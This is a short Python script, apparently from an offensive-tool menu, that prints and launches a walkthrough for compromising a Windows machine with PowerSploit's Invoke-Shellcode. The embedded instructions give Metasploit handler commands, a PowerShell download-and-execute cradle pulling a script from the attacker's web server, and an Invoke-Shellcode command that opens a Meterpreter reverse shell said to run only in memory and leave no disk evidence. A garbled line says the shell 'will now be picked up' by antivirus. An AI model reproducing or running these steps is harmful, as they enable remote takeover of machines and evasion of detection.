import os
import sys
from termcolor import colored
import time


def power():
	ps = 'powersploit'
	gt = 'gnome-terminal ' + ps
	msg = 'Type "ls -l" When Window Pops Up'
	comms = '''

cd CodeExecution
ls -l
^ After Typing Out  These Commands, Well Be Working With "Invoke-Shellcode.ps1" ^ 

You Now Will Need To Start Up A Web Server. Go To "/usr/share/powersploit"
python -m SimpleHTTPServer
^ This Command Will Start A Server Within Powersploit ^ 

On Target Machine Go To Start Menu --> Type Out 'Powershell' --> Press Enter
Keep Powershell Open And Open Browser And Navigate To Our Web Server. <IP Address>:<Port Number>
^ This Will Accept A Connection Between Computers. Now We Need To Start Up msfconsole. Once Started... ^ 

use exploit/multi/handler
set payload/windows/meterpreter/reverse_http
set lhost <IP Address>
set lport <Port Number>
exploit
^ These Commands Will Set Up And Run A Listener, Now We Just Wait For A Connection ^ 

> IEX(New-Object Net.WebClient).DownloadString ('http://<IP Address>:<Port Number>/CodeExecution/Invoke-Shellcode.ps1
^ Type The Following Into The Powersploit Window ^ 

> Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost <IP Address> -lport <Port Number> -Force
^ If Everything Runs Smoothly, This Script Will Start A Meterpreter Session on Windows Machine Within The Context Of The Powershell Process ^ 

In msfconsole, Type "sessions -l" To View All Sessions 

If Successful, The Meterpreter Shell Will Be Running In The Context Of The Powershell Process And Will Now Be Picked Up By AV Software
Also, The Meterpreter Is Running Entirely On Memory, Meaning That There Will Be No Evidence Found On The Hard Drive
	'''
	print(colored(msg, 'red'))
	print(colored('20 Second Timer Activated', 'yellow'))
	time.sleep(20)
	os.system(gt)

